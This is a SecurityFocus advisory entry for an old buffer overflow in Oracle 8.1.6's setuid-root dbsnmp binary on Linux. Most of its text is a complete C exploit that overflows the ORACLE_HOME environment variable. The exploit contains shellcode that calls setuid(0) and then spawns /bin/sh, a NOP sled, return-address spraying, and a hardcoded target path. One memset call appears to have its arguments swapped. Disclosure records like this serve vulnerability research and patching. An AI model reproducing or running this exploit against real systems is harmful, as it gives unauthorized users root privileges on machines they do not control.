source: http://www.securityfocus.com/bid/3138/info

Oracle is an Enterprise level SQL database, supporting numerous features and options. It is distributed and maintained by Oracle Corporation.

When the ORACLE_HOME environment variable is filled with 750 bytes or more, a buffer overflow occurs. This overflow may be used to overwrite variables on the stack, including the return address. Since the dbsnmp program is setuid root, it is possible to gain elevated privileges, including administrative access.

To exploit this vulnerability, the user must be in the oracle group. 

/* Exploit code for dbsnmp binary in Oracle 8.1.6.0.0 Linux Platform. I tested it in RH 6.2.

dbsnmp makes setresuid(,getuid(),) before reading ORACLE_HOME environment variable. Its necessary to call setuid(0) before normal shellcode.

In My tests Offset may vary from 7846 to 7896. Its posible to obtain a normal (uid=oracle) shell for low offsets (incomplete setuid(0) jumps). 



"Cae fuego en lugar de mana
Se disfraza el asfalto de mar
El zapato no encuentra el pedal
Parece que anda suelto satanas."

			L.E.Aute
 


This vulnerability was researched by:
	Juan Manuel Pascual <pask@plazasite.com>

Special thanks to:

	Ivan Sanchez <isanchez@plazasite.com>
	Mundo Alonso-Cuevillas <mundo@plazasite.com>
*/





#include <stdio.h>
#include <stdlib.h>

#define BUFFER                                  800
#define OFFSET                                 7896
#define NOP                                    0x90
#define BINARY  "/usr/local/oracle/app/oracle/product/8.1.6/bin/dbsnmp"


char shellcode[] =
"\x90"		/* Additional NOP */
"\x31\xc0"	/* begin setuid (0) */
"\x31\xdb"
"\xb0\x17"
"\xcd\x80"

"\xeb\x1f"
"\x5e"
"\x89\x76\x08"
"\x31\xc0"
"\x88\x46\x07"
"\x89\x46\x0c"
"\xb0\x0b"
"\x89\xf3"
"\x8d\x4e\x08"
"\x8d\x56\x0c"
"\xcd\x80"
"\x31\xdb"
"\x89\xd8"
"\x40"
"\xcd\x80"
"\xe8\xdc\xff\xff\xff"
"/bin/sh";


unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) {
  char *buff, *ptr,binary[120];
  long *addr_ptr, addr;
  int bsize=BUFFER;
  int i,offset=OFFSET;

  if (!(buff = malloc(bsize))) {
    printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_sp() -offset;
  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  memset(buff,bsize/2,NOP);

ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

buff[bsize - 1] = '\0';
setenv("ORACLE_HOME",buff,1);
system(BINARY);
}